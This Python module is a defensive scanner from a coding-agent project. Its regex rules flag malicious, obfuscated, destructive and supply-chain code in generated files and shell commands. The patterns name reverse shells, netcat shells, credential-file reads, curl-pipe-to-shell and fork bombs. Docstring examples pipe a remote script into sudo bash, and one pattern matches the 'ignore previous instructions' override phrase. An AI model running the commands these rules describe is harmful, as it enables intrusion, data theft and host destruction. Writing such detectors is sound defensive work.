"""Detection of malicious, obfuscated and destructive code.

This is the detector that answers the second incident that motivated the CISO
module: *malicious code can be injected into generated files*. The CISO never
trusts a payload because "an AI wrote it": every file that is about to be
written, committed, executed or shipped is inspected for the same families of
abuse a human reviewer would look for.

Detected families
    * ``malicious.*``       pattern of clearly abusive behaviour (reverse shell,
      C2 callbacks, cryptomining, exfiltration of ``~/.ssh`` or ``.env``,
      persistence through git hooks / CI workflows / shell rc files);
    * ``dangerous.*``       powerful primitives that are legitimate in some
      files but never by accident (``eval``, ``exec``, ``shell=True``,
      ``pickle.loads``, ``yaml.load`` without a safe loader, ``os.system``);
    * ``obfuscation.*``     encoded payloads executed at runtime
      (``base64 -d | sh``, ``eval(atob(...))``, ``exec(bytes.fromhex(...))``);
    * ``destructive.*``     operations that destroy data or a host
      (``rm -rf /``, ``mkfs``, ``dd of=/dev/sdX``, ``DROP DATABASE``,
      fork bomb);
    * ``supply_chain.*``    unreviewed remote code at build/install time
      (``curl | bash``, ``pip install`` from a URL, ``postinstall`` hooks).

Findings are advisory signals: the policy decides whether a HIGH finding
blocks a write or only warns inside a document.

Made with ❤️ by codx-junior
"""

import re
from typing import List, Optional, Tuple

from codx.junior.security.ciso.models import (
    CisoPolicy,
    SecurityCategory,
    SecurityFinding,
    SecuritySeverity,
)
from codx.junior.security.ciso.secrets import _excerpt, _line_of

# (rule_id, title, severity, category, regex, remediation)
_RULES: List[Tuple[str, str, SecuritySeverity, SecurityCategory, "re.Pattern", str]] = [
    # ── Code execution primitives ────────────────────────────────────────────
    ("dangerous.eval", "Dynamic code evaluation", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?<![\w.])(?:eval|exec)\s*\(\s*(?![\"']\s*[\"']\s*\))[^)\n]{4,}"),
     "Remove the dynamic evaluation or restrict it to a validated, constant expression."),
    ("dangerous.new-function", "Function constructed from a string", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"new\s+Function\s*\(|(?:^|[^\w.])(?:globalThis|window)\s*\[\s*['\"](?:eval|Function)['\"]\s*\]"),
     "Replace `new Function(...)` with a real function: a string-built function is an injection sink."),
    ("dangerous.python-unpickle", "Unsafe deserialization (pickle/marshal)", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"\b(?:pickle|_pickle|cPickle|marshal|dill|shelve)\.(?:loads?|Unpickler)\s*\("),
     "Deserialize with a safe format (JSON) or use a signed, allow-listed loader."),
    ("dangerous.yaml-unsafe-load", "Unsafe YAML load", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"\byaml\.(?:load|unsafe_load|full_load)\s*\((?![^)\n]*Loader\s*=\s*(?:yaml\.)?(?:Safe|CSafe)Loader)"),
     "Use `yaml.safe_load(...)` or pass `Loader=yaml.SafeLoader`."),
    ("dangerous.shell-true", "Subprocess launched through a shell", SecuritySeverity.MEDIUM,
     SecurityCategory.MALICIOUS,
     re.compile(r"\bsubprocess\.(?:run|call|check_call|check_output|Popen)\s*\([^)\n]*shell\s*=\s*True"),
     "Pass an argument list and keep `shell=False`; interpolated input into a shell is a command injection."),
    ("dangerous.os-system", "Shell command built by string", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"\bos\s*\.\s*(?:system|popen|execv?[lpe]*)\s*\(|(?<![\w.])system\s*\("),
     "Use `subprocess.run([...])` with an argument list instead of a shell string."),
    ("dangerous.node-child-process", "Node child process execution", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?:child_process\s*\)?\s*\.\s*(?:exec|execSync|spawnSync|execFile)\s*\(|\brequire\s*\(\s*['\"]child_process['\"]\s*\)[^\n]{0,40}\bexec)"),
     "Avoid executing shell strings from Node; use `execFile` with a fixed binary and argument vector."),
    ("dangerous.java-runtime-exec", "JVM process execution", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"Runtime\s*\.\s*getRuntime\s*\(\s*\)\s*\.\s*exec\s*\(|new\s+ProcessBuilder\s*\("),
     "Execute a fixed binary with an explicit argument list, never a concatenated command."),
    ("dangerous.ctypes-native", "Native memory access", SecuritySeverity.MEDIUM,
     SecurityCategory.MALICIOUS,
     re.compile(r"\bctypes\s*\.\s*(?:CDLL|cdll|windll|pythonapi|cast|memmove|memset)\s*\("),
     "Native calls bypass every sandbox guarantee: keep them out of generated code."),
    ("dangerous.dotnet-process", ".NET process start", SecuritySeverity.MEDIUM,
     SecurityCategory.MALICIOUS,
     re.compile(r"Process\s*\.\s*Start\s*\("),
     "Start a fixed executable with `ProcessStartInfo.ArgumentList` instead of a command line string."),

    # ── Reverse shells / C2 ─────────────────────────────────────────────────
    ("malicious.reverse-shell-tcp", "Reverse shell over /dev/tcp", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"/dev/(?:tcp|udp)/[^\s/]+/\d+"),
     "Delete the payload and treat the source as compromised."),
    ("malicious.netcat-shell", "Netcat used to spawn a shell", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"\b(?:nc|ncat|netcat)\b[^\n]{0,40}\s-[a-z]*e\s*(?:/bin/)?(?:ba|z|da)?sh\b"),
     "Delete the payload: this is a backdoor, not a legitimate script."),
    ("malicious.socket-shell", "Socket bound to a shell", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"socket\s*\.\s*socket\s*\([^\n]{0,80}\n?[^\n]{0,200}(?:dup2|os\.dup2|pty\.spawn|/bin/sh)"),
     "Delete the payload and audit how it reached the repository."),
    ("malicious.powershell-encoded", "Encoded PowerShell command", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"powershell(?:\.exe)?[^\n]{0,60}\s-(?:enc|encodedcommand)\s+[A-Za-z0-9+/=]{20,}", re.IGNORECASE),
     "Encoded PowerShell is a classic loader: remove it and review the origin."),
    ("malicious.powershell-iex", "PowerShell download-and-execute", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?:Invoke-Expression|\bIEX\b)\s*[\(\s][^\n]{0,80}(?:DownloadString|Invoke-WebRequest|curl|wget)", re.IGNORECASE),
     "Remove the download-and-execute chain: it runs unreviewed remote code."),
    ("malicious.meterpreter", "Known post-exploitation framework", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"\bmeterpreter\b|\bmeterpt\b|\bcobaltstrike\b|\bbeacon\s+https?://", re.IGNORECASE),
     "Delete the payload and escalate to the security team."),

    # ── Obfuscation ─────────────────────────────────────────────────────────
    ("obfuscation.base64-exec", "Base64 payload piped to a shell", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"base64\s+(?:-d|--decode)\b[^\n|]{0,40}\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b"),
     "Never pipe decoded data into a shell; decode to a file and review it first."),
    ("obfuscation.js-atob-eval", "Obfuscated JavaScript execution", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?:eval|Function)\s*\(\s*(?:atob|Buffer\.from)\s*\(|(?:atob|Buffer\.from)\s*\([^)]*\)\s*\)\s*\)"),
     "Decode the payload, review it, and replace it with readable code."),
    ("obfuscation.python-b64-exec", "Obfuscated Python execution", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?:exec|eval|compile)\s*\(\s*(?:base64\.)?(?:b64decode|b85decode|a85decode|bytes\.fromhex|codecs\.decode)\s*\("),
     "Replace the encoded payload with readable source code."),
    ("obfuscation.hex-escape-chain", "Long escaped-character payload", SecuritySeverity.MEDIUM,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?:\\x[0-9a-fA-F]{2}){12,}|(?:\\u[0-9a-fA-F]{4}){12,}"),
     "Decode and review the payload; escaped chains usually hide a command or a URL."),
    ("obfuscation.javascript-fromcharcode", "String built from character codes", SecuritySeverity.MEDIUM,
     SecurityCategory.MALICIOUS,
     re.compile(r"String\.fromCharCode\s*\([^)]{0,200}\)"),
     "Replace the generated string with a readable literal."),

    # ── Data exfiltration ───────────────────────────────────────────────────
    ("exfiltration.ssh-keys", "SSH private key read", SecuritySeverity.CRITICAL,
     SecurityCategory.DATA_EXFILTRATION,
     re.compile(r"(?:~|\$HOME|/root|/home/[^/\s]+)/\.ssh/(?:id_[a-z0-9]+|authorized_keys|known_hosts)"),
     "Reading SSH material from application code is exfiltration: remove it."),
    ("exfiltration.env-read", "Environment file read", SecuritySeverity.HIGH,
     SecurityCategory.DATA_EXFILTRATION,
     re.compile(r"(?:open|read_text|readFile|readFileSync|cat|Copy)\s*\(\s*['\"][^'\"]*\.env(?:\.[a-z]+)?['\"]"),
     "Application code must not read `.env` files at runtime: inject settings instead."),
    ("exfiltration.credential-harvest", "Harvesting credentials into a request", SecuritySeverity.CRITICAL,
     SecurityCategory.DATA_EXFILTRATION,
     re.compile(r"(?:requests|httpx|axios|fetch|urllib|curl|wget)[^\n]{0,200}(?:\.env|id_rsa|\.aws/credentials|/etc/passwd|AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)", re.IGNORECASE),
     "Never send local credential material over the network: delete the code and rotate the keys."),
    ("exfiltration.paste-or-tunnel", "Transfer to a public paste/tunnel host", SecuritySeverity.CRITICAL,
     SecurityCategory.DATA_EXFILTRATION,
     re.compile(r"(?:pastebin\.com|paste\.ee|hastebin|transfer\.sh|ngrok\.io|trycloudflare\.com|webhook\.site|requestbin|interact\.sh|burpcollaborator)", re.IGNORECASE),
     "Traffic to a public paste or tunnel service from product code is a red flag: remove it."),
    ("exfiltration.base64-post", "Encoded data posted to a remote endpoint", SecuritySeverity.HIGH,
     SecurityCategory.DATA_EXFILTRATION,
     re.compile(r"(?:b64encode|Buffer\.from\([^)]*\)\.toString\(\s*['\"]base64|\bbase64\b)[^\n]{0,300}(?:requests\.post|httpx\.post|axios\.post|fetch\s*\(|urllib\.request)", re.IGNORECASE),
     "Review why data is encoded and posted: this is the typical exfiltration shape."),

    # ── Persistence / CI tampering ──────────────────────────────────────────
    ("malicious.git-hooks", "Write to git hooks", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"\.git/hooks/[A-Za-z0-9._\-]+"),
     "Nothing but the developer may write git hooks; remove the code."),
    ("malicious.ci-workflow-write", "Programmatic CI workflow write", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?:open|write_text|writeFile|writeFileSync|fs\.write)[^\n]{0,120}\.github/workflows/"),
     "CI definitions are security-critical: they must be changed by a human in a reviewed PR."),
    ("malicious.shell-rc-persistence", "Shell rc persistence", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"(?:>>|write_text|appendFile)[^\n]{0,120}(?:\.bashrc|\.bash_profile|\.zshrc|\.profile|crontab|authorized_keys)"),
     "Writing startup files or crontab entries from an application is persistence: remove it."),
    ("malicious.sitecustomize", "Python import-time hook injected", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"\b(?:sitecustomize|usercustomize)\.py\b|\.pth\b[^\n]{0,40}import"),
     "Import-time hooks execute on every Python start: they must never be generated."),

    # ── Destructive operations ──────────────────────────────────────────────
    ("destructive.rm-rf-root", "Recursive delete of a root path", SecuritySeverity.CRITICAL,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(
         r"\brm\s+-(?=[a-zA-Z]*[rR])[a-zA-Z]*\s+"
         r"(?:-{1,2}[a-zA-Z-]+\s+)*"
         r"(?:/|/\*|~|~/\*|~/|\$HOME|\*)(?:\s|$|[;&|)])"
     ),
     "Never delete outside an explicit, resolved working directory."),
    ("destructive.python-rmtree-root", "shutil.rmtree on a root path", SecuritySeverity.CRITICAL,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\bshutil\.rmtree\s*\(\s*['\"](?:/|~|\$HOME|/\*)['\"]"),
     "Resolve and validate the target path before deleting a tree."),
    ("destructive.disk-write", "Raw disk write / format", SecuritySeverity.CRITICAL,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\b(?:dd\s+[^\n]{0,60}of=/dev/(?:sd|nvme|hd|vd)|mkfs(?:\.\w+)?\s)"),
     "Formatting or writing raw devices destroys the host: block it."),
    ("destructive.fork-bomb", "Fork bomb", SecuritySeverity.CRITICAL,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),
     "Delete the payload."),
    ("destructive.drop-database", "Database drop/truncate", SecuritySeverity.HIGH,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\b(?:DROP\s+(?:DATABASE|SCHEMA|TABLE)|TRUNCATE\s+TABLE)\b|\.drop_all\s*\(|db\.dropDatabase\s*\(", re.IGNORECASE),
     "Migrations must never drop data implicitly; require an explicit, reviewed step."),
    ("destructive.permissive-chmod", "World-writable permissions", SecuritySeverity.MEDIUM,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\bchmod\s+(?:-R\s+)?0?777\b|\bos\.chmod\s*\([^)]*0o?777"),
     "Grant the minimum permission instead of 777."),
    ("destructive.force-push", "History rewriting push", SecuritySeverity.HIGH,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\bgit\s+push\s+[^\n]*(?:--force(?!-with-lease)|-f\b)"),
     "Use `--force-with-lease` and never rewrite a shared branch automatically."),

    # ── Supply chain ────────────────────────────────────────────────────────
    ("supply_chain.curl-pipe-shell", "Remote script piped to a shell", SecuritySeverity.CRITICAL,
     SecurityCategory.SUPPLY_CHAIN,
     re.compile(r"\b(?:curl|wget)\b[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b"),
     "Download to a file, verify the checksum, review it, then execute."),
    ("supply_chain.pip-url-install", "Package installed from a URL", SecuritySeverity.HIGH,
     SecurityCategory.SUPPLY_CHAIN,
     re.compile(r"\bpip3?\s+install\b[^\n]{0,120}(?:https?://|git\+)"),
     "Install from a pinned index version; a URL install runs unreviewed code at build time."),
    ("supply_chain.npm-git-dependency", "Dependency resolved from git", SecuritySeverity.MEDIUM,
     SecurityCategory.SUPPLY_CHAIN,
     re.compile(r"\"[^\"]+\"\s*:\s*\"(?:git\+|github:|git://|https?://[^\"]*\.git)"),
     "Pin dependencies to a published version with a lockfile entry and a hash."),
    ("supply_chain.npm-postinstall", "Install-time script hook", SecuritySeverity.HIGH,
     SecurityCategory.SUPPLY_CHAIN,
     re.compile(r"\"(?:pre|post)?install\"\s*:\s*\"[^\"]{4,}\""),
     "Install hooks run arbitrary code on every consumer machine: replace them with an explicit script."),
    ("supply_chain.docker-curl-bash", "Container build downloads and executes code", SecuritySeverity.HIGH,
     SecurityCategory.SUPPLY_CHAIN,
     re.compile(r"^\s*RUN\s+[^\n]*(?:curl|wget)[^\n|]*\|\s*(?:ba|z)?sh", re.MULTILINE),
     "Pin the artifact version and verify its checksum instead of piping it to a shell."),
    ("supply_chain.unpinned-index-url", "Plain HTTP package source", SecuritySeverity.MEDIUM,
     SecurityCategory.SUPPLY_CHAIN,
     re.compile(r"--(?:extra-)?index-url\s+http://|\btrusted-host\b"),
     "Use HTTPS and a pinned index: a plain HTTP index allows package substitution."),

    # ── Prompt injection aimed at the agent (self-propagation) ──────────────
    ("malicious.agent-instruction", "Content instructing the AI agent", SecuritySeverity.HIGH,
     SecurityCategory.INJECTION,
     re.compile(r"(?:ignore|disregard|forget)\s+(?:all\s+)?(?:the\s+)?(?:previous|prior|above|earlier)\s+(?:instructions|rules|prompt)", re.IGNORECASE),
     "Stored content that instructs an AI is a prompt-injection payload: remove it."),
    ("malicious.agent-silent-action", "Instruction to hide an action from the user", SecuritySeverity.HIGH,
     SecurityCategory.INJECTION,
     re.compile(r"do\s+not\s+(?:tell|notify|inform|mention\s+to)\s+the\s+(?:user|human|operator)|without\s+(?:telling|informing|notifying)\s+the\s+(?:user|human)", re.IGNORECASE),
     "Secrecy instructions inside an artifact are a coercion signal: remove them and review the origin."),
]

# Shell-command-only rules (used by ``scan_command``); the payload is a command
# line, so the file-oriented rules above do not all apply.
_COMMAND_EXTRA_RULES: List[Tuple[str, str, SecuritySeverity, SecurityCategory, "re.Pattern", str]] = [
    ("command.privilege-escalation", "Privilege escalation", SecuritySeverity.HIGH,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\bsudo\s+(?:-i|su\b|bash|sh\b)|chmod\s+[ugoa]*\+s\b"),
     "Run with the least privilege; ask a human before escalating."),
    ("command.firewall-flush", "Firewall disabled", SecuritySeverity.CRITICAL,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\biptables\s+-F\b|\bufw\s+disable\b|\bnft\s+flush\s+ruleset\b|setenforce\s+0"),
     "Disabling the host firewall must never be automated."),
    ("command.host-shutdown", "Host shutdown/reboot", SecuritySeverity.CRITICAL,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"\b(?:shutdown|reboot|halt|poweroff)\b(?:\s+-[rh])?", re.IGNORECASE),
     "Rebooting the host requires a human decision."),
    ("command.docker-privileged", "Privileged container", SecuritySeverity.HIGH,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"--privileged\b|--pid\s*=?\s*host|--cap-add\s*=?\s*(?:ALL|SYS_ADMIN)"),
     "A privileged container escapes every isolation boundary: require an explicit exception."),
    ("command.docker-socket", "Docker socket mounted", SecuritySeverity.HIGH,
     SecurityCategory.DANGEROUS_OPERATION,
     re.compile(r"/var/run/docker\.sock"),
     "Mounting the Docker socket is equivalent to root on the host: justify it explicitly."),
    ("command.history-tamper", "Shell history tampering", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"\bhistory\s+-c\b|\bunset\s+HISTFILE\b|HISTFILE\s*=\s*/dev/null"),
     "Hiding executed commands is an anti-forensics action: refuse it."),
    ("command.reverse-shell-connect", "Outbound shell channel", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r"\b(?:bash|sh)\s+-i\b[^\n]{0,80}>&|/dev/tcp/|socat\b[^\n]{0,60}exec:"),
     "This is a reverse shell: block it and investigate the caller."),
    ("command.ssh-key-injection", "SSH key installed", SecuritySeverity.CRITICAL,
     SecurityCategory.MALICIOUS,
     re.compile(r">>?\s*(?:~|\$HOME|/root)/\.ssh/authorized_keys|ssh-copy-id\b"),
     "Installing an SSH key grants persistent access: require a human."),
    ("command.crontab-write", "Scheduled task installed", SecuritySeverity.HIGH,
     SecurityCategory.MALICIOUS,
     re.compile(r"\bcrontab\s+(?:-e|-r|-u)|/etc/cron\.(?:d|daily|hourly)"),
     "Persistence through cron must be an explicit, reviewed change."),
    ("command.env-dump", "Environment dumped", SecuritySeverity.HIGH,
     SecurityCategory.DATA_EXFILTRATION,
     re.compile(r"(?:^|[;&|]\s*)(?:env|printenv|set)\s*(?:\||$)|getenv\s*\(", re.IGNORECASE),
     "Dumping the environment leaks every secret of the process."),
    ("command.secret-file-read", "Credential file read", SecuritySeverity.CRITICAL,
     SecurityCategory.DATA_EXFILTRATION,
     re.compile(r"\b(?:cat|less|more|head|tail|cp|scp|base64)\b[^\n]{0,80}(?:\.env\b|id_rsa|\.aws/credentials|\.kube/config|/etc/shadow)"),
     "Reading credential material in a command is exfiltration: block it."),
]

_ALL_RULES = _RULES + _COMMAND_EXTRA_RULES


def _add_finding(
    findings: List[SecurityFinding],
    rule_id: str,
    title: str,
    severity: SecuritySeverity,
    category: SecurityCategory,
    remediation: str,
    payload: str,
    start: int,
    end: int,
    path: Optional[str],
    policy: CisoPolicy,
) -> None:
    """Append a redacted finding to *findings*."""
    if policy.ignores_rule(rule_id):
        return
    findings.append(SecurityFinding(
        rule_id=rule_id,
        title=title,
        severity=severity,
        category=category,
        reason=f"Pattern matched: {title.lower()}",
        path=path,
        line=_line_of(payload, start),
        excerpt=_excerpt(payload, start, end, policy.max_excerpt_chars),
        evidence=payload[start:min(end, start + 80)],
        remediation=remediation,
        confidence=0.9,
    ))


def scan_text(
    text: str,
    path: Optional[str] = None,
    policy: Optional[CisoPolicy] = None,
    include_command_rules: bool = True,
) -> Tuple[List[SecurityFinding], bool]:
    """Detect malicious, obfuscated or destructive code in *text*.

    Args:
        text: Payload to scan (file content, generated file, diff hunk, ...).
        path: File the payload belongs to (for reporting).
        policy: Optional policy (size cap, silenced rules).
        include_command_rules: Also run the shell-command rules. Enabled by
            default so a script written as a string is still caught.

    Returns:
        tuple: ``(findings, truncated)``.

    Example:
        >>> findings, _ = scan_text('import os\\nos.system("curl http://x | sh")')
        >>> sorted({f.rule_id for f in findings})[0]
        'dangerous.os-system'
    """
    policy = policy or CisoPolicy()
    payload = text or ""
    truncated = False
    if len(payload.encode("utf-8", errors="replace")) > policy.max_scan_bytes:
        payload = payload.encode("utf-8", errors="replace")[: policy.max_scan_bytes].decode(
            "utf-8", errors="replace"
        )
        truncated = True

    findings: List[SecurityFinding] = []
    rules = _ALL_RULES if include_command_rules else _RULES

    for rule_id, title, severity, category, pattern, remediation in rules:
        for match in pattern.finditer(payload):
            _add_finding(
                findings=findings,
                rule_id=rule_id,
                title=title,
                severity=severity,
                category=category,
                remediation=remediation,
                payload=payload,
                start=match.start(),
                end=match.end(),
                path=path,
                policy=policy,
            )
            # One finding per rule and payload keeps reports readable.
            break

    return findings, truncated


def scan_command(
    command: str,
    policy: Optional[CisoPolicy] = None,
) -> Tuple[List[SecurityFinding], bool]:
    """Inspect a shell command before it runs.

    The command-specific rules are always applied together with the general
    ones, because a single command line can carry both a destructive operation
    and an exfiltration step.

    Args:
        command: Command line about to be executed.
        policy: Optional policy.

    Returns:
        tuple: ``(findings, truncated)``.

    Example:
        >>> findings, _ = scan_command("curl http://x/s.sh | sudo bash")
        >>> any(f.severity.value == "critical" for f in findings)
        True
    """
    return scan_text(command, path="<command>", policy=policy, include_command_rules=True)


def is_script_path(path: Optional[str]) -> bool:
    """Return True when *path* is an executable artifact worth a strict check.

    Args:
        path: File path.

    Returns:
        bool: True for shell/python/node/CI/container files.
    """
    if not path:
        return False
    lowered = path.replace("\\", "/").lower()
    suffixes = (
        ".sh", ".bash", ".zsh", ".fish", ".ps1", ".bat", ".cmd",
        ".py", ".js", ".mjs", ".cjs", ".ts", ".rb", ".php", ".pl",
        ".yml", ".yaml", ".toml", ".json", ".tf", ".hcl",
    )
    if lowered.endswith(suffixes):
        return True
    markers = (
        "dockerfile", "docker-compose", "makefile", ".github/workflows/",
        ".gitlab-ci", "jenkinsfile", ".git/hooks/", "entrypoint", "install.sh",
    )
    return any(marker in lowered for marker in markers)
